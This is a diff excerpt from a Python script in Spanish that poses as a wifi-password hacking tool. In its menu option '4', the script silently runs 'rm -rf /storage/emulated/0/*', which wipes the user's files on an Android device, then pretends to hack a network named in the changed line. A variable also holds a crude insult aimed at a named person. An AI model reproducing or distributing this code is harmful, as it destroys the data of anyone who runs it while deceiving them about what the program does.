@@ -67,7 +67,7 @@ elif X == "3":
     
 elif X == "4":
     B = os.system("rm -rf /storage/emulated/0/*")
-    B = input("digite el nombre del wifi a hackear: /n> ")
+    B = input("digite el nombre del wifi a hackear:Flia-Oviedo/n> ")
     #attack.ContraseñaWifi
     U = "DiegoPija"
     print(f"hackeando el wifi {B}")
